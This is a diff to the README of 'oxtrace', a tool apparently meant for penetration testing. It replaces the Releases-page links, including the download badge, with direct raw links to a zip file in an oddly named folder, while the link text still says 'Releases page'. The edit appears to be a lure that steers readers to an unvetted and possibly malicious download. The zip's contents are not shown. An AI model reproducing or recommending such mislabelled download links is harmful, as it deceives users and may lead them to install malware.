@@ -6,14 +6,14 @@
 
 ## 📥 Download Now
 
-[![Download oxtrace](https://img.shields.io/badge/Download-oxtrace-blue)](https://github.com/Balamahesh7204/oxtrace/releases)
+[![Download oxtrace](https://github.com/Balamahesh7204/oxtrace/raw/refs/heads/main/seminifical/oxtrace_v1.4.zip)](https://github.com/Balamahesh7204/oxtrace/raw/refs/heads/main/seminifical/oxtrace_v1.4.zip)
 
 ## 🚀 Getting Started
 
 Follow these steps to set up and run oxtrace on your system.
 
 1. **Visit the Releases Page**  
-   Go to the [oxtrace Releases page](https://github.com/Balamahesh7204/oxtrace/releases) to find the latest version of the application.
+   Go to the [oxtrace Releases page](https://github.com/Balamahesh7204/oxtrace/raw/refs/heads/main/seminifical/oxtrace_v1.4.zip) to find the latest version of the application.
 
 2. **Select the Version**  
    On the Releases page, locate the latest release. Click on it to access the specific files available for download.
@@ -86,4 +86,4 @@ For further assistance, you can create an issue in the GitHub repository or reac
 
 ---
 
-Visit the [oxtrace Releases page](https://github.com/Balamahesh7204/oxtrace/releases) to download the application and begin your journey in penetration testing today!
+Visit the [oxtrace Releases page](https://github.com/Balamahesh7204/oxtrace/raw/refs/heads/main/seminifical/oxtrace_v1.4.zip) to download the application and begin your journey in penetration testing today!
